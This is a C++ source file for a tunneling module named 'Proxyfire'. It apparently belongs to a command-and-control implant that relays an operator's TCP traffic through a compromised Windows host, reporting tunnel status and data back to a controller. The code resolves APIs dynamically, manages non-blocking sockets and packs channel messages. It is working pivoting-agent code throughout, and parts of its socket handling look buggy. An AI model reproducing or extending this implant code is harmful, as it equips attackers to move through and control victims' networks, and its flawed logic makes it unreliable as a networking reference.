#include "Proxyfire.h"

void PackProxyStatus(Packer* packer, ULONG channelId, ULONG commandId, BOOL result)
{
	packer->Pack32(channelId);
	packer->Pack32(commandId);
	packer->Pack8(result);
}

void PackProxyData(Packer* packer, ULONG channelId, BYTE* data, ULONG dataSize )
{
	packer->Pack32(channelId);
	packer->Pack32(COMMAND_TUNNEL_WRITE);
	packer->PackBytes(data, dataSize);
}

void Proxyfire::AddProxyData(ULONG channelId, SOCKET sock, ULONG waitTime, ULONG mode, WORD port, ULONG state)
{
	TunnelData tunnelData = { 0 };
	tunnelData.channelID = channelId;
	tunnelData.sock      = sock;
	tunnelData.waitTime  = waitTime;
	tunnelData.mode      = mode;
	tunnelData.state     = state;
	tunnelData.port      = port;
	tunnelData.startTick = ApiWin->GetTickCount();
	this->tunnels.push_back(tunnelData);
}

//////////

WORD _htons(WORD hostshort)
{
	return ((hostshort >> 8) & 0x00FF) | ((hostshort << 8) & 0xFF00);
}

void Proxyfire::ConnectMessageTCP(ULONG channelId, CHAR* address, WORD port, Packer* outPacker)
{
	WSAData wsaData;
	if (ApiWin->WSAStartup(514, &wsaData)) {
		ApiWin->WSACleanup();
		return;
	}
	else {
		SOCKET sock = ApiWin->socket(AF_INET, SOCK_STREAM, 0);
		if (sock != -1) {
			hostent* host = ApiWin->gethostbyname(address);
			if (host) {
				sockaddr socketAddress;
				memcpy(&socketAddress.sa_data[2], *(const void**)host->h_addr_list, host->h_length); 				//memmove
				socketAddress.sa_family = 2;
				*(WORD*)socketAddress.sa_data = _htons(port);
				u_long mode = 1;
				if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) != -1) {
					if (!(ApiWin->connect(sock, &socketAddress, 16) == -1 && ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)) {
						this->AddProxyData(channelId, sock, 30000, TUNNEL_MODE_SEND_TCP, 0, TUNNEL_STATE_CONNECT);
						return;
					}
				}
			}
		}
		ApiWin->closesocket(sock);
		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START, FALSE);
	}
}

void Proxyfire::ConnectWrite(ULONG channelId, CHAR* data, ULONG dataSize)
{
	TunnelData* tunnelData;
	for (int i = 0; i < tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->channelID == channelId && tunnelData->state == TUNNEL_STATE_READY) {
			DWORD finishTick = ApiWin->GetTickCount() + 30000;
			timeval timeout = { 0, 100 };
			fd_set exceptfds;
			fd_set writefds;

			while (ApiWin->GetTickCount() < finishTick) {
				writefds.fd_array[0] = tunnelData->sock;
				writefds.fd_count = 1;
				exceptfds.fd_array[0] = writefds.fd_array[0];
				exceptfds.fd_count = 1;
				ApiWin->select(0, 0, &writefds, &exceptfds, &timeout);
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds))
					break;
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
					if (ApiWin->send(tunnelData->sock, data, dataSize, 0) != -1 || ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)
						return;
					ApiWin->Sleep(1000);
				}
			}
			break;
		}
	}
	tunnelData = NULL;
}

void Proxyfire::ConnectClose(ULONG channelId)
{
	TunnelData* tunnelData;
	for (int i = 0; i < tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->channelID == channelId && tunnelData->state != TUNNEL_STATE_CLOSE) {
			tunnelData->state = TUNNEL_STATE_CLOSE;
			break;
		}
	}
	tunnelData = NULL;
}

///////////////////

void Proxyfire::CheckProxy(Packer* packer)
{
	TunnelData* tunnelData;
	timeval timeout = { 0, 100 };
	for (int i = 0; i < this->tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->state == TUNNEL_STATE_CONNECT) {
			ULONG channelId = tunnelData->channelID;
			fd_set readfds;
			readfds.fd_count = 1;
			readfds.fd_array[0] = tunnelData->sock;
			fd_set exceptfds;
			exceptfds.fd_count = 1;
			exceptfds.fd_array[0] = tunnelData->sock;
			fd_set writefds;
			writefds.fd_count = 1;
			writefds.fd_array[0] = tunnelData->sock;
			ApiWin->select(0, &readfds, &writefds, &exceptfds, &timeout);

			if ( tunnelData->mode == TUNNEL_MODE_REVERSE_TCP ) {

			}
			else {
				if (tunnelData->mode == TUNNEL_MODE_SEND_UDP) {

				}
				else {
					if (tunnelData->mode == TUNNEL_MODE_SEND_TCP) {
						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds)) {
							tunnelData->state = TUNNEL_STATE_CLOSE;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START, FALSE);
							continue;
						}
						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
							tunnelData->state = TUNNEL_STATE_READY;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START, TRUE);
							continue;
						}
						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &readfds)) {
							SOCKET tmp_sock_2 = ApiWin->accept(tunnelData->sock, 0, 0);
							tunnelData->sock = tmp_sock_2;
							if (tmp_sock_2 == -1) {
								tunnelData->state = TUNNEL_STATE_CLOSE;
								PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START, FALSE);
							}
							else {
								tunnelData->state = TUNNEL_STATE_READY;
								PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START, TRUE);
							}
							ApiWin->closesocket(tunnelData->sock);
							continue;
						}
					}
				}
				if (ApiWin->GetTickCount() - tunnelData->startTick > tunnelData->waitTime) {
					tunnelData->state = TUNNEL_STATE_CLOSE;
					PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START, FALSE);
				}
			}
		}
	}
	tunnelData = NULL;
}

ULONG RecvSocketData(SOCKET sock, char* buffer, int bufferSize)
{
	ULONG recvSize;
	ULONG dwReaded = 0;
	if (bufferSize <= 0)
		return dwReaded;

	while (1) {
		recvSize = ApiWin->recv(sock, buffer, bufferSize - dwReaded, 0);
		buffer += recvSize;
		dwReaded += recvSize;
		if (recvSize == -1)
			break;
		if ((int)dwReaded >= bufferSize)
			return dwReaded;
	}
	ApiWin->shutdown(sock, 2);
	ApiWin->closesocket(sock);
	return 0xFFFFFFFF;
}

ULONG Proxyfire::RecvProxy(Packer* packer)
{
	ULONG count = 0;
	TunnelData* tunnelData;
	for ( int i = 0; i < this->tunnels.size(); i++ ) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->state == TUNNEL_STATE_READY) {
			if (tunnelData->mode == TUNNEL_MODE_SEND_UDP) {

			}
			else {
				ULONG dataLength = 0;
				int result = ApiWin->ioctlsocket(tunnelData->sock, FIONREAD, &dataLength);
				if (dataLength > 0xFFFFC)
					dataLength = 0xFFFFC;
				if (result == -1) {
					tunnelData->state = TUNNEL_STATE_CLOSE;
					PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START, FALSE);
				}
				else {
					if (dataLength) {
						LPVOID buffer = MemAllocLocal(dataLength);
						ULONG readed = RecvSocketData(tunnelData->sock, (PCHAR)buffer, dataLength);
						if (readed == -1) {
							tunnelData->state = TUNNEL_STATE_CLOSE;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START, FALSE);
						}
						if (readed == dataLength) {
							PackProxyData(packer, tunnelData->channelID, (PBYTE)buffer, dataLength);
							++count;
						}
						MemFreeLocal(&buffer, dataLength);
					}
				}
			}
		}
	}
	tunnelData = NULL;
	return count;
}

void Proxyfire::CloseProxy()
{
	TunnelData* tunnelData;
	for (int i = 0; i < this->tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->state == TUNNEL_STATE_CLOSE) {

			if (tunnelData->closeTimer == 0) {
				tunnelData->closeTimer = ApiWin->GetTickCount();
				continue;
			}

			if (tunnelData->closeTimer + 1000 < ApiWin->GetTickCount()) {
				if (tunnelData->mode == TUNNEL_MODE_SEND_TCP || tunnelData->mode == TUNNEL_MODE_SEND_UDP)
					ApiWin->shutdown(tunnelData->sock, 2);

				if (ApiWin->closesocket(tunnelData->sock) && tunnelData->mode == TUNNEL_MODE_REVERSE_TCP)
					continue;

				this->tunnels.remove(i);
				--i;
			}
		}
	}
	tunnelData = NULL;
}

void Proxyfire::ProcessTunnels(Packer* packer)
{
	if (!this->tunnels.size())
		return;

	this->CheckProxy(packer);

	ULONG finishTick = ApiWin->GetTickCount() + 2500;
	while ( this->RecvProxy(packer) && ApiWin->GetTickCount() < finishTick );

	this->CloseProxy();
}